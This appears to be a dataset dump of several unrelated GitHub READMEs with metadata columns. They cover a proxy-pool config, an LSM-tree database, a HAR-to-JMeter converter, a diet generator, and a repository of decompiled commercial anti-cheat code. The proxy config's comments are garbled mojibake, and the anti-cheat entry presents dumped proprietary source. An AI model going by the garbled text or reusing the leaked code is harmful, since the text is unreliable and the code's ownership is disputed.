# ä»£ç†æœåŠ¡å™¨å¯åŠ¨ç«¯å£ï¼Œæœ¬ç³»ç»Ÿå°†ä¼šåœ¨é…ç½®ç«¯å£èŒƒå›´è¿ç»­å¯åŠ¨å¤šä¸ªä»£ç†æœåŠ¡å™¨
mappingSpace=36000-36010
# æ˜¯å¦å¯ç”¨éšæœºéš§é“ï¼Œå¯ç”¨éšæœºéš§é“ä¹‹åï¼Œæ¯æ¬¡ä»£ç†è¯·æ±‚å°†ä¼šä½¿ç”¨éšæœºçš„IPå‡ºå£
randomTurning=false
# æ˜¯å¦å¯ç”¨æ± é—´è·¯ç”±ï¼Œæ± é—´è·¯ç”±æ”¯æŒæ ¹æ®IPæ± çš„å¥åº·çŠ¶æ€åœ¨å¤šä¸ªIPæ± ä¹‹é—´åŠ¨æ€è°ƒæ•´æ¯”ä¾‹
enableFloatIpSourceRatio=true
# failoveræ¬¡æ•°ï¼Œå³ç³»ç»Ÿä¸ºå¤±è´¥çš„ä»£ç†è½¬å‘è¿›è¡Œçš„å……å®
maxFailoverCount=3
# ä»£ç†è¿æ¥è¶…æ—¶æ—¶é—´
handleSharkConnectionTimeout=5000
# é‰´æƒç”¨æˆ·ï¼Œå³ç”¨æˆ·è¿æ¥åˆ°proxy_composeçš„é‰´æƒ
auth_username=iinti
# é‰´æƒå¯†ç 
auth_password=iinti
# ä½¿ç”¨IPç™½åå•ï¼Œæˆ–è€…IPç«¯çš„æ–¹å¼è¿›è¡Œé‰´æƒ
auth_white_ips=122.23.43.0/24,29.23.45.65

# å®šä¹‰IPèµ„æºï¼Œå³ä»IPä¾›åº”å•†é‡‡è´­çš„IPèµ„æº,è¦æ±‚è‡³å°‘é…ç½®ä¸€ä¸ªIPèµ„æº
# section è¦æ±‚ä»¥ ã€Šsource:ã€‹å¼€å§‹
[source:dailiyun]
# æœ¬èµ„æºæ˜¯å¦å¯ç”¨ï¼Œå¦‚æœå¸Œæœ›ä¸´æ—¶å…³é—­æœ¬èµ„æºï¼Œä½†æ˜¯ä¸å¸Œæœ›åˆ é™¤é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨æœ¬å¼€å…³
enable=true
# IPèµ„æºä¸‹è½½è¿æ¥
loadURL=http://ä¿®æ”¹è¿™é‡Œ.user.xiecaiyun.com/api/proxies?action=getText&key=ä¿®æ”¹è¿™é‡Œ&count=ä¿®æ”¹è¿™é‡Œ&word=&rand=false&norepeat=false&detail=false&ltime=0
# IPèµ„æºæ ¼å¼ï¼Œç›®å‰æ”¯æŒplainï¼Œjsonä¸¤ç§æ ¼å¼ï¼Œå…¶ä¸­jsonæ ¼å¼éœ€è¦æ»¡è¶³jsonæ ¼å¼è¦æ±‚ cn.iinti.proxycompose.resource.ProxyIp
resourceFormat=plain
# Ipä¾›åº”æä¾›çš„ä»£ç†è´¦æˆ·ï¼ˆå¦‚æœæ˜¯ç™½åå•ï¼Œåè€…æ— é‰´æƒï¼Œåˆ™æ— éœ€é…ç½®ï¼‰
upstreamAuthUser=ä¿®æ”¹è¿™é‡Œ
# Ipä¾›åº”æä¾›çš„ä»£å¯†ç 
upstreamAuthPassword=ä¿®æ”¹è¿™é‡Œ
# IPæ± å¤§å°ï¼Œéå¸¸é‡è¦ï¼Œæ­¤å­—æ®µä¸ºæ‚¨çš„IPä¾›åº”å•†å•æ¬¡æå–è¿”å›çš„èŠ‚ç‚¹æ•°
poolSize=10
# æœ¬IPèµ„æºæ± æ˜¯å¦éœ€è¦æ¢æµ‹IPè´¨é‡ï¼Œå¦‚å¼€å¯ï¼Œåˆ™IPéœ€è¦è¢«éªŒè¯å¯ç”¨åæ–¹å¯åŠ å…¥IPæ± 
needTest=true
# IPèµ„æºä¸‹è½½é—´éš”æ—¶é—´ï¼Œå•ä½ç§’
reloadInterval=240
# IPèµ„æºå…¥åº“åæœ€é•¿å­˜æ´»æ—¶é—´ï¼Œå•ä½ç§’ï¼Œè¾¾åˆ°æ­¤æ—¶é—´åï¼Œå¯¹åº”IPèµ„æºå°†ä¼šä»IPæ± ä¸­ç§»é™¤ï¼Œé™¤éè¢«é‡æ–°ä¸‹è½½åˆ°IPæ± ä¸­
maxAlive=300
# å½“å‰IPèµ„æºæ”¯æŒçš„ä»£ç†åè®®ï¼ˆå»ºè®®è‡³å°‘é€‰æ‹©æ”¯æŒsocks5çš„èµ„æºï¼‰
supportProtocol=socks5,https,http
# è¿æ¥æ± è¿æ¥ç©ºè½¬æ—¶é—´ï¼Œå•ä½ç§’ï¼ŒIPæ± å°†ä¼šæå‰åˆ›å»ºåˆ°ä»£ç†çœŸå®ä»£ç†æœåŠ¡å™¨çš„è¿æ¥ï¼Œç»™ä¸šåŠ¡ä½¿ç”¨æä¾›åŠ é€ŸåŠŸèƒ½
connIdleSeconds=20
# æå‰åˆ›å»ºè¿æ¥çš„æ—¶é—´é—´éš”ï¼Œå•ä½ç§’
makeConnInterval=20
# å½“å‰IPæ± åœ¨æ± é—´æµé‡æ¯”ä¾‹ï¼Œå½“å­˜åœ¨å¤šä¸ªIpèµ„æºé…ç½®æ—¶ï¼Œæœ¬é…ç½®æœ‰æ•ˆï¼Œå³ä¸šåŠ¡æŒ‰ç…§æ­¤æ¯”ä¾‹å¯¹å¤šä¸ªIPæ± è¿›è¡Œæµé‡æƒ…åˆ‡
ratio=1
```

## ç‰¹åˆ«è¯´æ˜

ComposeProxyæœ¬èº«èƒ½åšçš„å·¥ä½œéå¸¸ä¸°å¯Œï¼Œæ›´å¤šæƒ³è±¡ç©ºé—´å¯ä»¥å‚è€ƒæˆ‘ä»¬å¯¹åº”çš„å•†ä¸šåˆ†æ”¯ï¼š[malenia](https://malenia.iinti.cn/malenia-doc/)
ç”¨æˆ·å¦‚æäº¤ä»»ä½•æ–°çš„åŠŸèƒ½ï¼ˆå³ä½¿å’Œå•†ä¸šåˆ†æ”¯é‡å ï¼‰å‡å¯ä»¥è¢«æ¥æ”¶",0,0,1,0.0,"['proxycompose', 'section']","['proxycompose', 'section']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:appassembler-maven-plugin]",0.0,1.0,0.0
KhushPatibandha/RiceDB,main,"ï»¿
# RiceDB: LSMTree based storage system

RiceDB is a storage system based on a very popular NoSQL architecture, Log-structured merge-trees also known as LSM Trees. This architecture is followed in many DBs like Amazon's DynamoDB, Cassandra, ScyllaDB, RocksDB, etc.

This storage system is designed to offer fast write throughput with decently fast read operations. This can be used in many embedded storage engines because of the simple key-value pair interface.

This application has all the major components that are required in a system like this.
 - Memtable / in-memory store implemented with AVL Trees
 - SSTable file disk storage
 - Sparse Index for each SSTable for fast reads
 - Bloom Filter for optimization
 - Compaction to deal with Tombstone, stale entries
## API Reference

#### Insert a key-value pair

```http
  POST /api/insert

  json => {
    ""key"" : ""youKey"",
    ""value"" : ""yourValue""
  }
```


#### Update a key-value pair

```http
  PUT /api/update

  json => {
    ""key"" : ""youKey"",
    ""value"" : ""yourValue""
  }
```

#### Delete a key

```http
  DELETE /api/delete?key=<youKey>
```

#### Get a value

```http
  GET /api/get?key=<yourKey>
```

#### Recover logs and memory after crash

```http
  PUT /api/recover
```

",0,0,2,0.0,"['ricedb', 'lsmtree', 'base', 'storage', 'system', 'api', 'reference', 'insert', 'pair', 'update', 'pair', 'delete', 'key', 'get', 'value', 'recover', 'log', 'memory', 'crash']","['pair', 'ricedb', 'lsmtree', 'base', 'storage']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
Araykal/Open-Karhu,master,"## Karhu Anti Cheat ##
**The project from the mysterious person to provide the Jar decompiled open source!**
new dump is working ï½

**The source code for will not use please look at the individual iq This source code does not have any problem if iq not please download the Release version**

* version: 2.7.5
* website: [Karhu](https://karhu.ac)

## Downloads
**[Releases](https://github.com/Araykal/Open-Karhu/releases)** Download.'

## The original dump project
- [Originnal Repo](https://github.com/nuym/Open-Karhu)
## Special Note

Our main purpose for open sourcing this project is to help people deeply understand the unique checks and measures Karhu takes against cheaters. We do not intend to sell, reuse or profit in any way from Karhuâ€™s code.

## Special Thanks
- [Karhu](https://www.karhu.ac/) developed this anti cheat
- [nuym](https://github.com/nuym) dumped this project
- [NaerQAQ](https://github.com/NaerQAQ) provided karhu license
- [ts](https://github.com/uniformization) helped me dump the classes and compile
- [huzpsb](https://github.com/huzpsb) fix some errors


",2,0,1,1.0,"['karhu', 'anti', 'cheat', 'downloads', 'the', 'original', 'dump', 'project', 'special', 'note', 'special', 'thanks']","['special', 'karhu', 'anti', 'cheat', 'downloads']",1.0,"[org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
vdaburon/har-convertor-jmeter-plugin,main,"<p align=""center"">
<img src=""https://github.com/vdaburon/har-convertor-jmeter-plugin/blob/main/doc/har_convertor_tool_logo.png"" alt=""har convertor jmeter plugin logo""/>
  <p align=""center"">Convert a HAR file to a JMeter script and a Record XML file.</p>
  <p align=""center""><a href=""https://github.com/vdaburon/har-convertor-jmeter-plugin"">Link to github project har-convertor-jmeter-plugin</a></p>
</p>

# Convert a HAR file to a JMeter script and a Record XML file.

An article about motivations to create this tool: https://dzone.com/articles/convert-a-har-file-to-jmeter-script

## GUI interface in the JMeter Tools Menu
This tool is present in the Menu Tools > vdn@github - HAR Convertor Tool

![Menu Tools](doc/images/jmeter_menu_tools_with_har_convertor.png)

When you click and the menu line ""vdn@github - HAR Convertor Tool"", the tool GUI is display

![Menu Tools](doc/images/har_convertor_tool_gui.png)

### Parameters
Parameters are :
* har_in the HAR file to read (exported HAR from Web Browser :  Chrome, Firefox, Edge ...)
* jmx_out the file JMeter script generated, if the text field is empty then the jmx_out is the file name of har_in without the extension with suffix "".jmx"" <br/>
  e.g. har_in = myhar1.har, jmx_out is empty then file_out will be myhar1.jmx
* record_out create the record xml file from the har file (could be open with the Listener View Results Tree) <br/>
  e.g. record_out = record.xml
* add_result_tree_record, add a View Result Tree to view the Recording XML File Generated (default true), the record_out must be not empty
* external_file_infos, external csv file contains information about Timestamp, Transaction Name, date start or end. <br/>
    e.g. external_file_infos = myappli_transactions.csv
* new_tc_pause time between 2 urls to create a new page (Transaction Controller) (default 5000 = jmeter property value : proxy.pause=5000) <br/>
  * e.g. 5000 for 5 sec between 2 urls
* page_start_number, set the start page number for partial recording (default 1, must be an integer > 0) <br/>
* sampler_start_number, set the start sampler number for partial recording (default 1, must be an integer > 0) <br/>
* filter_include, the regular expression matches the URL to Include (first filter) <br/>
  * default all = empty (no filter)
  * e.g. filter_include=https://mysite.com/.*
* filter_exclude, the regular expression matches the URL to Exclude (second filter) <br/>
  * default all = empty (no filter)
  * e.g. filter_exclude=https://notmysite.com/.*
  * or filter statics, filter_exclude=(?i).*\.(bmp|css|js|gif|ico|jpe?g|png|swf|eot|otf|ttf|mp4|woff|woff2|svg)
* add_pause checkbox, add Flow Control Action Pause, parameter new_tc_pause must be > 0 (default true) <br/>
* remove_cookie checkbox , remove header with cookie because add a Cookie Manager in the script (default true) <br/>
* remove_cache_request checkbox, remove cache request header because add a Cache Manager in the script (default true) <br/>
* har created with lrwr, the har file has been generated with LoadRunner Web Recorder Chrome extension and contains Transaction Name, expected values : true or false (default false = unchecked) <br/>


Status, the status line contains the tool status or the tool result.

e.g. : Status Results **OK**
* Tool HAR Convertor Finished OK, fileJmxOut=C:\Temp\script1.jmx
* Tool HAR Convertor Finished OK, fileJmxOut=C:\Temp\script1.jmx AND recordXmlOut=C:\Temp\record.xml

e.g. : Status Results **KO**
* Tool HAR Convertor Finished KO, CAN'T READ HAR fileHarIn = C:\Temp\harzzzz.har
* Tool HAR Convertor Finished KO, exception = java.util.regex.PatternSyntaxException: Unmatched closing ')' near index 2  (.))
* Tool HAR Convertor Finished KO, exception = net.sf.saxon.trans.XPathException: Failed to create output file file:/c:/toto.jmx

### Action buttons
* ""CONVERT AND LOAD GENERATED SCRIPT"", generates the JMeter script and record.xml file if set, next if no error LOAD the generated script in the current JMeter.
* ""CONVERT"", generates the JMeter script and record.xml file if set.

## Creating a har file and run the tool har-to-jmx-convertor to simulate recording from the JMeter recording template
This tool har-to-jmx-convertor try to **simulate** a script JMeter and a record xml file recording from the **JMeter Recording Template**.

### JMeter Recording Template and HTTP(S) Test Script Recorder  - The standard way to record
The JMeter Recording Template : <br/>
![JMeter recording template start](doc/images/jmeter_record_template_begin.png)

The result of recording with JMeter ""HTTP(S) Test Script Recorder"" : <br/>
![JMeter script and record](doc/images/jmeter_record_template_tree_view.png)

### HAR created on a Browser (e.g. Firefox) - The new way with the convertor tool
Record the navigation in the web application with Developer tool : **Network** and **save** exchanges in **HAR** file format : <br/>
![Browser save HAR file](doc/images/browser_create_har.png)

Launch the ""Convertor tool"" : <br/>
![Step to create script and record from HAR file](doc/images/browsers_har_convertor_script_record.png)

Tool results : Open the script created and the record.xml in a View Results Tree <br/>
![Open the script created](doc/images/jmeter_script_record_created.png)

### HAR created in Chrome Browser with the LoadRunner Web Recorder Chrome Extension
This tool is compatible with Har file generated with the LoadRunner Web Recorder Chrome Extension.

The main advantage is to declare **Transaction Names when recording** and navigate to the web site. This transactions will be Page Names (Transaction Controllers names) in the JMeter script.

![Step to create script and record from HAR file from LoadRunner Web Recorder](doc/images/lrwr_chrome_extension_har_convertor_script_record.png)

The LoadRunner Web Recorder Chrome Extension is available at this url : <br/>
[Download the Recorder extension for Chrome : ""HarGeneratorChrome""](https://www.microfocus.com/marketplace/appdelivery/content/recorder-extension-for-chrome)

You need to check to checkbox ""HAR was generated with LoadRunner Web Recorder and Transaction Names"" to indicate that is a HAR file generated with LoadRunner Web Recorder (lrwr), default false (unchecked).

### Standard HAR file created with Firefox, Chrome, Edge with external csv file for transaction information
You could add an external file that contains information about transaction name start and end.

![Step to create script and record from HAR file and external csv file](doc/images/browers_har_external_csv_convertor_script_record.png)

The format is :
- <code>Timestamp iso format GMT;TRANSACTION;transaction name;start</code> for starting a new transaction
- <code>Timestamp iso format GMT;TRANSACTION;transaction name;stop</code> for ending transaction the precedent transaction
- Separator "";""
- Charset UTF-8

E.g :
<pre>
2024-05-06T12:39:58.711Z;TRANSACTION;login;start
2024-05-06T12:40:08.643Z;TRANSACTION;login;stop
2024-05-06T12:40:20.880Z;TRANSACTION;home;start
2024-05-06T12:40:37.634Z;TRANSACTION;home;stop
</pre>

A simple tool named ""create-external-file-for-har"" create easily this csv file. https://github.com/vdaburon/create-external-file-for-har

You need to select the csv file in the text field : ""(Optional) External csv file with transaction info (to read) ""

### HAR created with BrowserMob Proxy
This tool is compatible with Har file generated with BrowserMob Proxy.

The BrowserMob Proxy create a har and could filter url or content (no binary). 

The proxy client could be a browser or a client http in an application.

BrowserMob Proxy could be embedded in a java application or in Selenium java code application.

![Step to create script and record from HAR file from BrowserMob](doc/images/browsermob-proxy_har_convertor_script_record.png)

The BrowserMob Proxy is available at this url : <br/>
[Download the BrowserMob Proxy](https://github.com/lightbody/browsermob-proxy)

## More documentation from har-to-jmeter-convertor
For more documentation look at README from [har-to-jmeter-convertor](https://github.com/vdaburon/har-to-jmeter-convertor)

## Command line tool (CLI)
This tool could be use with script shell Windows or Linux.

Scripts shell are in &lt;JMETER_HOME&gt;\bin
* har-convertor-to-jmeter.cmd for Windows OS
* har-convertor-to-jmeter.sh for Linux/Mac OS

Help to see all parameters :

<pre>
C:\apache-jmeter\bin&gt;har-convertor-to-jmeter.cmd -help

usage: io.github.vdaburon.jmeter.har.HarForJMeter [-add_pause &lt;add_pause&gt;] [-add_result_tree_record
       &lt;add_result_tree_record&gt;] [-external_file_infos &lt;external_file_infos&gt;] [-filter_exclude &lt;filter_exclude&gt;]
       [-filter_include &lt;filter_include&gt;] -har_in &lt;har_in&gt; [-help] -jmx_out &lt;jmx_out&gt; [-new_tc_pause &lt;new_tc_pause&gt;]
       [-page_start_number &lt;page_start_number&gt;] [-record_out &lt;record_out&gt;] [-remove_cache_request
       &lt;remove_cache_request&gt;] [-remove_cookie &lt;remove_cookie&gt;] [-sampler_start_number &lt;sampler_start_number&gt;]
       [-use_lrwr_infos &lt;use_lrwr_infos&gt;]
io.github.vdaburon.jmeter.har.HarForJMeter
 -add_pause &lt;add_pause&gt;                             Optional boolean, add Flow Control Action Pause after Transaction
                                                    Controller (default true)
 -add_result_tree_record &lt;add_result_tree_record&gt;   Optional boolean, add 'View Result Tree' to view the record.xml file
                                                    created (default true), record_out must be not empty
 -external_file_infos &lt;external_file_infos&gt;         Optional, csv file contains external infos : timestamp transaction
                                                    name and start or end
 -filter_exclude &lt;filter_exclude&gt;                   Optional, regular expression to exclude url
 -filter_include &lt;filter_include&gt;                   Optional, regular expression to include url
 -har_in &lt;har_in&gt;                                   Har file to read (e.g : my_file.har)
 -help                                              Help and show parameters
 -jmx_out &lt;jmx_out&gt;                                 JMeter file created to write (e.g : script.jmx)
 -new_tc_pause &lt;new_tc_pause&gt;                       Optional, create new Transaction Controller after request ms, same
                                                    as jmeter property : proxy.pause, need to be &gt; 0 if set. Usefully
                                                    for Har created by Firefox or Single Page Application (Angular,
                                                    ReactJS, VuesJS ...)
 -page_start_number &lt;page_start_number&gt;             Optional, the start page number for partial recording (default 1)
 -record_out &lt;record_out&gt;                           Optional, file xml contains exchanges likes recorded by JMeter
 -remove_cache_request &lt;remove_cache_request&gt;       Optional boolean, remove cache header in the http request (default
                                                    true because add a Cache Manager)
 -remove_cookie &lt;remove_cookie&gt;                     Optional boolean, remove cookie in http header (default true because
                                                    add a Cookie Manager)
 -sampler_start_number &lt;sampler_start_number&gt;       Optional, the start sampler number for partial recording (default 1)
 -use_lrwr_infos &lt;use_lrwr_infos&gt;                   Optional, the har file has been generated with LoadRunner Web
                                                    Recorder and contains Transaction Name, expected value :
                                                    'transaction_name' or don't add this parameter
E.g : java -jar har-for-jmeter-&lt;version&gt;-jar-with-dependencies.jar -har_in myhar.har -jmx_out scriptout.jmx -record_out
recording.xml -add_result_tree_record true -new_tc_pause 5000 -add_pause true -filter_include ""https://mysite/.*""
-filter_exclude ""https://notmysite/*"" -page_start_number 50 -sampler_start_number 250
</pre>

<pre>
C:\apache-jmeter\bin>har-convertor-to-jmeter.cmd -har_in ""myhar.har"" -jmx_out ""script_out.jmx"" -filter_include ""https://mysite.com/.*"" -filter_exclude ""https://notmysite.com/.*"" -add_pause true -new_tc_pause 5000
</pre>

<pre>
/var/opt/apache-jmeter/bin>./har-convertor-to-jmeter.sh -har_in ""myhar.har"" -jmx_out ""script_out.jmx"" -record_out ""record.xml"" -add_pause true -new_tc_pause 5000
</pre>

## Tool installed with jmeter-plugins-manager
This tool could be installed with the jmeter-plugins-manager from jmeter.plugins.org.<br>
The tool name is : ""vdn@github - har-convertor-jmeter-tool""

## Usage Maven
The maven groupId, artifactId and version, this plugin is in the **Maven Central Repository** [![Maven Central har-convertor-jmeter-plugin](https://maven-badges.herokuapp.com/maven-central/io.github.vdaburon/har-convertor-jmeter-plugin/badge.svg)](https://maven-badges.herokuapp.com/maven-central/io.github.vdaburon/har-convertor-jmeter-plugin)

```xml
<groupId>io.github.vdaburon</groupId>
<artifactId>har-convertor-jmeter-plugin</artifactId>
<version>6.0</version>
```

## License
Licensed under the Apache License, Version 2.0

## Versions
Version 6.0 date 2024-09-19, Use new library har-to-jmeter-convertor 6.0 for adding 'HTTP(S) Test Script Recorder' and 'View Results Tree' to view the Record.xml file created. Correct save file no url encoded name.

Version 5.3 date 2024-09-13, Use new library har-to-jmeter-convertor 5.3 that correct PUT with no parameter, no content and mime-type ==  null

Version 5.2 date 2024-06-20, Use new library har-to-jmeter-convertor 5.2 that correct extract parameters for mime type ""form-urlencoded"" ended with charset likes ""application/x-www-form-urlencoded; charset=xxx""

Version 5.1 date 2024-05-17, Compatible with har generated by browsermob-proxy tool and csv file contains transaction infos. Use library har-to-jmeter-convertor 5.1.

Version 5.0 date 2024-05-10, Add an external csv file with transaction information for JMeter Transaction Controller Name. New parameter : <code>-external_file_infos transaction_info.csv</code>. Correct Filter Include first filter and Filter Exclude second filter.

Version 4.0 date 2024-05-06, Add compatibility with HAR generated with LoadRunner Web Recorder Chrome Extension. New checkbox ""(Optional) HAR was generated with LoadRunner Web Recorder and Transaction Names""

Version 3.2 date 2024-03-30, Use library har-to-jmeter-convertor-2.2.jar, this version encode value for x-www-form-urlencoded when value contains space ' ' or equal '=' or slash '/' or plus '+' characters. Correct add the content for body data for POST, PUT or PATCH if not x-www-form-urlencoded in the Record.xml file.

Version 3.1 date 2024-03-29, Use library har-to-jmeter-convertor-2.2.jar, this version remove the header 'Content-length' because the length is computed by JMeter when the request is created. POST or PUT could have query string and body with content so add query string to the path. Set Content Encoding to UFT-8 for POST or PUT method and request Content-Type : application/json. Add body data content in record.xml for PUT and PATCH methods.

Version 3.0 date 2024-03-18, Add Load generated script if no error. File Chooser select only file and no directory.

Version 2.0 date 2024-03-12, for POST multipart/form-data don't put the content of the file in the Record.xml file because binary content could be large and not XML compatible. Add parameters : page_start_number and sampler_start_number to facilitate partial recording of website navigation.

Version 1.0 date 2024-03-11, First Release.

",9,1,1,0.0,"['convert', 'har', 'file', 'jmeter', 'script', 'record', 'xml', 'file', 'gui', 'interface', 'jmeter', 'tool', 'menu', 'parameter', 'action', 'button', 'create', 'har', 'file', 'run', 'tool', 'simulate', 'record', 'jmeter', 'record', 'template', 'jmeter', 'recording', 'template', 'http', 's', 'test', 'script', 'recorder', 'the', 'standard', 'way', 'record', 'har', 'create', 'browser', 'firefox', 'the', 'new', 'way', 'convertor', 'tool', 'har', 'create', 'chrome', 'browser', 'loadrunner', 'web', 'recorder', 'chrome', 'extension', 'standard', 'har', 'file', 'create', 'firefox', 'chrome', 'edge', 'external', 'csv', 'file', 'transaction', 'information', 'har', 'create', 'browsermob', 'proxy', 'more', 'documentation', 'command', 'line', 'tool', 'cli', 'tool', 'instal', 'usage', 'maven', 'license', 'version']","['har', 'file', 'tool', 'create', 'jmeter']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
undermad/diet-generator-api,main,"# Fatatu - Diet Generator

![C2 screenshot](/screenshots/fatatu_logo.png)

## Technology Stack

### Backend

![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring Boot](https://img.shields.io/badge/Spring%20Boot-6DB33F?style=for-the-badge&logo=spring-boot&logoColor=white)
![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white)
![Apache Maven](https://img.shields.io/badge/Apache%20Maven-C71A36?style=for-the-badge&logo=Apache%20Maven&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)

### Frontend

![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
![React](https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB)
![Vite](https://img.shields.io/badge/vite-%23646CFF.svg?style=for-the-badge&logo=vite&logoColor=white)
![NPM](https://img.shields.io/badge/NPM-%23CB3837.svg?style=for-the-badge&logo=npm&logoColor=white)
![MaterialUI](https://img.shields.io/badge/Material--UI-007FFF?style=for-the-badge&logo=mui&logoColor=white)

# LIVE APPLICATION <-- [https://www.fatatu.com](https://www.fatatu.com)

The application has been deployed. You are welcome to play with it, is relative simple and satisfying to use.

# HOW TO RUN IT ON YOUR LOCAL MACHINE

---

## 1. Make sure you have Docker and Docker Compose installed.

Install Docker [LINK](https://docs.docker.com/engine/install/)

Install Docker Compose [LINK](https://docs.docker.com/compose/install/)

## 2. Obtain CalorieNinjas API Key

To use this application you need API Key from CalorieNinjas. Registration is straight forward, easy and quick. Free tier
allows
to perform 10000 requests per month what is definitely sufficient.

Registration under this [LINK](https://www.calorieninjas.com/register)

If you are logged in, go to MyAccount section or click this [LINK](https://calorieninjas.com/profile) and copy the API
Key after clicking 'Show API Key'.

## 3. Install Git

If Git is not installed yet on your machine just follow the instructions under
this [LINK](https://github.com/git-guides/install-git).

## 4. Clone GitHub Repository

From command line, navigate to your folder of choose

```
git clone https://github.com/undermad/diet-generator-api
```

Move to the cloned repository

```
cd diet-generator-api
```

## 5. Set environment variable

Create `.env` file in root folder (diet-generator-api), open it using any text editor and add the line:

```
NINJA_API_KEY=YOUR_API_KEY
```

Replace `YOUR_API_KEY` with the key from CalorieNinjas.

## 6. Start Docker Compose

Start Docker Compose (Make sure Docker is running)
It may take several minutes to download all dependencies, be patient and enjoy the application.

```
docker compose up
```

Once docker containers are running you can access the presentation website under this [LINK](http://localhost:5173/) or
enter directly in your browser `http://localhost:5173/`.
API base url is as follow `http://localhost:8080/api/v1/`. See presentation layer documentation to discover available
endpoints or visit [SWAGGER](http://localhost:8080/swagger-ui/index.html) / `http://localhost:8080/swagger-ui/index.html`

# 100 Commits!

---

![Proteins Code screenshot](/screenshots/100commitow_ss.png)

This application was developed for the competitive event ""100 Commits"" organized by DevMentors.

The primary objective of the competition is to create an original Open Source project over the course of 100 days.

The rules are simple:

Participants must make at least one commit to the main branch of their registered repository every day. There is some
flexibility allowedâ€”each participant can take one day off without a commit, referred to as a ""JOKER"" day.

The grand prize for the winner is a MacBook Pro M3.

For more information, visit the official website.  [LINK](https://100commitow.pl/)

Checkout DevMentors on YouTube. [PL](https://www.youtube.com/@DevMentorsPL)
or [ENG](https://www.youtube.com/@DevMentorsEN)

# DOCUMENTATION

1. [Introduction](#1-introduction)
   
   1.1 [About Importance of Documentation](#11-about-importance-of-documentation) 

   1.2 [What is Fatatu?](#12-what-is-fatatu)

   1.3 [Why this repository exist?](#13-why-this-repository-exists)
   
   1.4 [Disclaimer](#14-disclaimer)

   1.5 [Star and share](#15-star-and-share)

2. [Architecture](#2-architecture)

   2.1 [Clean Architecture](#21-clean-architecture)

   2.2 [C4 Model](#22-c4-model)

   2.2.1 [C1 System Context](#221-c1-system-context)

   2.2.2 [C2 Container](#222-c2-container)

   2.2.3 [C3 Component](#223-c3-component)

   2.2.4 [C4 Code Calculator Component](#224-c4-code---calculator-component)

   2.2.4 [C1 Diet Component](#224-c4-code---diet-generator-component)

   2.2.4 [C1 Ninja Service Component](#224-c4-code---ninja-service-component)

3. [Domain](#3-domain)

   3.1 [How human body works](#31-how-human-body-works)

   3.1.1 [How kcal works](#311-how-kcal-works)

   3.1.2 [BMI](#312-bmi)

   3.1.3 [TDEE](#313-tdee)

   3.1.4 [TEF](#314-tef)

   3.2 [Data Representation](#32-data-representation)

   3.2.1 [Product](#321-product)

   3.2.2 [Filler](#322-filler)

   3.2.3 [Nutrients](#323-nutrients)

   3.2.4 [Recipe](#324-recipe)

   3.2.5 [MealType](#325-mealtype)

   3.2.6 [DietType](#326-diettype)

   3.2.7 [BigDecimal](#327-bigdecimal)

   3.2.8 [Dish](#328-dish)

   3.2.9 [Diet](#329-diet)

   3.3 [Calculators](#33-calculators)

   3.3.1 [BMICalculator](#331-bmicalculator)

   3.3.2 [BMRCalculator](#332-bmrcalculator)

   3.3.3 [MacroCalculator](#333-macrocalculator)

   3.4 [Generators](#34-generators)

   3.4.1 [DietGenerator](#341-dietgenerator)

   3.4.2 [ShoppingListGenerator](#342-shoppinglistgenerator)

4. [Application](#4-application)

   4.1 [Repositories](#41-repositories)

   4.1 [Use Cases](#42-use-cases)

5. [Infrastructure](#5-infrastructure)

   5.1 [Spring Boot configuration](#51-spring-boot-configuration)

   5.1.1 [Bean Configuration](#511-bean-configuration)

   5.1.2 [Cors Configuration](#512-cors-configuration)

   5.1.3 [Error Handling](#513-error-handling)

   5.2 [Calories Ninjas](#52-calories-ninjas)

   5.3 [Persistence](#53-persistence)

   5.3.1 [Documents](#531-documents)

   5.3.2 [Mappers](#532-mappers)

   5.3.3 [Repositories](#533-repositories)

6. [Presentation](#6-presentation)

   6.1 [Controllers endpoints](#61-controllers-endpoints)

7. [Docker](#7-docker)
8. [Inspiration](#8-inspirations)







# 1. Introduction

---

### 1.1 About Importance of Documentation

Wherever I go, I constantly hear about the importance of documentation in software development. Many times, I've tried
to use a library only to find that the lack of proper documentation made it incredibly difficult to understand and
implement. This experience underscores a critical point: if we, as software developers, want to build software
effectively as teams, we must pay close attention to how we explain our thoughts and code. Good documentation is not
just a nice-to-have; it is essential for collaboration, maintenance, and onboarding new team members. It bridges the gap
between developers' intentions and users' understanding, ensuring that our work is accessible and usable by others.
Without it, even the most elegant code can become an impenetrable black box, hindering productivity and innovation.

### 1.2 What is Fatatu?

Fatatu is a diet generator application that will generate a list of meals with all ingredients and nutrition information
based on provided criteria such as required kcal, diet targets, diet type, etc.
In addition, each diet will provide a shopping list.

With one click you can get a diet and go straight to the shop and buy what you need, you don't need to waste time on
browsing for recipes or adjusting macros. This application will do it for you.

### 1.3 Why this repository exists?

**First reason:** This application was created as an idea that I had in mind for a couple of months/years, and finally I
decided to create it.

**Second reason:** [100commits](https://100commitow.pl/) competitive event gave me motivation to begin this project and
push my skills to the next level.

**Third reason:** I found that creating applications from beginning to the end including deployment is extremely
beneficial in
improving my skills as a Software Developer. With this repository, I decided to learn MongoDB, apply clean architecture,
and
implement comprehensive documentation.

### 1.4 Disclaimer

I am a beginner software developer with less than 2 years of experience who do it as a hobby. I never work in a
professional
environment. I learn everything from books, online courses,
documentation, blogs, forums, YouTube, and AI. Forgive me if something isn't okay in this repo.

### 1.5 Star and share

If you like my work here, you can appreciate me with the star and perhaps share this application with your friends.

Happy coding!

# 2. Architecture

---

This application is simple monolith that utilize clean architecture approach.


